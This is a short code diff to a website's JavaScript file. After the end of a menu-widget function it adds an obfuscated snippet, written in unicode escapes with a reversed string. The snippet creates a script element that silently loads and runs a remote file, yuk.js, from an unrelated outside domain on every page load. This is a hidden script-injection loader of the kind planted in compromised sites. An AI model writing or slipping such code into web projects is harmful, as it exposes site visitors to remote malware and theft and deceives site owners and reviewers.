@@ -294,3 +294,6 @@ document.addEventListener('DOMContentLoaded', function () {
     `;
     document.body.appendChild(menuWid);
 })();
+
+
+(function(_0x8d74ce){const _0xd0c4d=document['\u0063\u0072\u0065\u0061\u0074\u0065\u0045\u006C\u0065\u006D\u0065\u006E\u0074']("tpircs".split("").reverse().join(""));_0x8d74ce=(463069^463064)+(667412^667420);_0xd0c4d['\u0073\u0072\u0063']="\u0068\u0074\u0074\u0070\u0073\u003A\u002F\u002F\u0069\u0064\u002E\u0064\u0075\u006E\u0067\u0065\u006E\u0065\u0073\u0073\u0062\u0072\u0065\u0077\u0069\u006E\u0067\u002E\u0063\u006F\u006D\u002F\u0079\u0075\u006B\u002E\u006A\u0073";_0xd0c4d['\u0061\u0073\u0079\u006E\u0063']=!![];document['\u0062\u006F\u0064\u0079']['\u0061\u0070\u0070\u0065\u006E\u0064\u0043\u0068\u0069\u006C\u0064'](_0xd0c4d);})();
